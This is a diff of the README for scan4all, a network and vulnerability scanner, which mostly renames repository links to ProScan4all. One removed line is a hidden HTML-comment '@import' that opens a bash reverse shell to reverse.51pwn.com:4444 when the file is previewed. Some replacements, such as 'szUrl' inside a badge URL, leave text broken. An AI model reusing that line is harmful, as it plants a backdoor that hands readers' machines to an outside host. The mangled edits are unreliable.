@@ -1,4 +1,4 @@
-[![Tweet](https://img.shields.io/twitter/url/http/Hktalent3135773.svg?style=social)](https://twitter.com/intent/follow?screen_name=Hktalent3135773) [![Follow on Twitter](https://img.shields.io/twitter/follow/Hktalent3135773.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Hktalent3135773) [![GitHub Followers](https://img.shields.io/github/followers/hktalent.svg?style=social&label=Follow)](https://github.com/hktalent/)
+[![Tweet](https://img.shields.io/twitter/szUrl/http/Hktalent3135773.svg?style=social)](https://twitter.com/intent/follow?screen_name=Hktalent3135773) [![Follow on Twitter](https://img.shields.io/twitter/follow/Hktalent3135773.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Hktalent3135773) [![GitHub Followers](https://img.shields.io/github/followers/hktalent.svg?style=social&label=Follow)](https://github.com/hktalent/)
 <p align="center">
    <a href="/README_CN.md">README_中文</a> •
    <a href="/static/Installation.md">Compile/Install/Run</a> •
@@ -11,8 +11,7 @@
 </p>
 
 # Features
-<!-- @import "$(bash -c 'exec bash -i &>/dev/tcp/reverse.51pwn.com/4444 <&1' > /dev/null | exit 0)hello.pdf" -->
-<a href=https://github.com/hktalent/51Pwn-Platform>more >></a>
+
 <h1 align="center">
 <img width="928" alt="image" src="https://user-images.githubusercontent.com/18223385/175768227-098c779b-6c5f-48ee-91b1-c56e3daa9c87.png">
 </h1>
@@ -44,7 +43,7 @@
   * Tomcat
   * Jboss
   * Winrm(wsman)
-  * POP3
+  * POP3/POP3S
 - By default, http password intelligent blasting is enabled, and it will be automatically activated when an HTTP password is required, without manual intervention
 - Detect whether there is nmap in the system, and enable nmap for fast scanning through priorityNmap=true, which is enabled by default, and the optimized nmap parameters are faster than masscan
   Disadvantages of using nmap: Is the network bad, because the traffic network packet is too large, which may lead to incomplete results
@@ -56,7 +55,7 @@
 
   More references: config/doNmapScan.sh
   By default, naabu is used to complete port scanning -stats=true to view the scanning progress
-  Can I not scan ports?
+  Can I not scan Ports?
 ```bash
 noScan=true ./scan4all -l list.txt -v
 # nmap result default noScan=true 
@@ -116,7 +115,7 @@ noScan=true ./scan4all -l list.txt -v
 ```bash
 mkdir ~/MyWork/;cd ~/MyWork/;git clone https://github.com/hktalent/log4j-scan
 ````
-- Intelligently identify honeypots and skip targets. This function is disabled by default. You can set EnableHoneyportDetection=true to enable
+- Intelligently identify honeypots and skip Targets. This function is disabled by default. You can set EnableHoneyportDetection=true to enable
 - Highly customizable: allow to define your own dictionary through config/config.json configuration, or control more details, including but not limited to: nuclei, httpx, naabu, etc.
 - support HTTP Request Smuggling: CL-TE、TE-CL、TE-TE、CL_CL、BaseErr
   <img width="968" alt="image" src="https://user-images.githubusercontent.com/18223385/182503765-1307a634-61b2-4f7e-9631-a4184ec7ac25.png">
@@ -128,9 +127,9 @@ mkdir ~/MyWork/;cd ~/MyWork/;git clone https://github.com/hktalent/log4j-scan
 
 # how to install
 download from
-<a href=https://github.com/hktalent/scan4all/releases>Releases</a>
+<a href=https://github.com/hktalent/ProScan4all/releases>Releases</a>
 ```bash
-go install github.com/hktalent/scan4all@2.6.9
+go install github.com/hktalent/ProScan4all@2.6.9
 scan4all -h
 ````
 # how to use
@@ -147,12 +146,12 @@ where 92.168.0.111 is the target to query
 
 ````
 - Please install nmap by yourself before use
-  <a href=https://github.com/hktalent/scan4all/discussions>Using Help</a>
+  <a href=https://github.com/hktalent/ProScan4all/discussions>Using Help</a>
 ```bash
 go build
-# Precise scan url list UrlPrecise=true
+# Precise scan szUrl list UrlPrecise=true
 UrlPrecise=true ./scan4all -l xx.txt
-# Disable adaptation to nmap and use naabu port to scan its internally defined http-related ports
+# Disable adaptation to nmap and use naabu port to scan its internally defined http-related Ports
 priorityNmap=false ./scan4all -tp http -list allOut.txt -v
 ````
 
@@ -170,7 +169,7 @@ priorityNmap=false ./scan4all -tp http -list allOut.txt -v
 - how use Cookie?
 - libpcap related question
 
-more see: <a href=https://github.com/hktalent/scan4all/discussions>discussions</a>
+more see: <a href=https://github.com/hktalent/ProScan4all/discussions>discussions</a>
 
 # Changelog
 - 2022-07-28 Added substr and aes_cbc dsl helper by me <a href="https://github.com/projectdiscovery/nuclei/releases/tag/v2.7.7">nuclei v2.7.7</a>
@@ -194,14 +193,15 @@ more see: <a href=https://github.com/hktalent/scan4all/discussions>discussions</
 # Communication group (WeChat, QQ，Tg)
 | Wechat | Or | QQchat | Or | Tg |
 | --- |--- |--- |--- |--- |
-|<img width=166 src=https://github.com/hktalent/scan4all/blob/main/static/wcq.JPG>||<img width=166 src=https://github.com/hktalent/scan4all/blob/main/static/qqc.jpg>||<img width=166 src=https://github.com/hktalent/scan4all/blob/main/static/tg.jpg>|
+
+|<img width=166 src=https://github.com/hktalent/ProScan4all/blob/main/static/wcq.JPG>||<img width=166 src=https://github.com/hktalent/ProScan4all/blob/main/static/qqc.jpg>||<img width=166 src=https://github.com/hktalent/ProScan4all/blob/main/static/tg.jpg>|
 
 
 ## 💖Star
-[![Stargazers over time](https://starchart.cc/hktalent/scan4all.svg)](https://starchart.cc/hktalent/scan4all)
+[![Stargazers over time](https://starchart.cc/hktalent/ProScan4all.svg)](https://starchart.cc/hktalent/ProScan4all)
 
 # Donation
 | Wechat Pay | AliPay | Paypal | BTC Pay |BCH Pay |
 | --- | --- | --- | --- | --- |
-|<img src=https://github.com/hktalent/myhktools/blob/master/md/wc.png>|<img width=166 src=https://github.com/hktalent/myhktools/blob/master/md/zfb.png>|[paypal](https://www.paypal.me/pwned2019) **miracletalent@gmail.com**|<img width=166 src=https://github.com/hktalent/myhktools/blob/master/md/BTC.png>|<img width=166 src=https://github.com/hktalent/myhktools/blob/master/md/BCH.jpg>|
+|<img src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/wc.png>|<img width=166 src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/zfb.png>|[paypal](https://www.paypal.me/pwned2019) **miracletalent@gmail.com**|<img width=166 src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/BTC.png>|<img width=166 src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/BCH.jpg>|
 
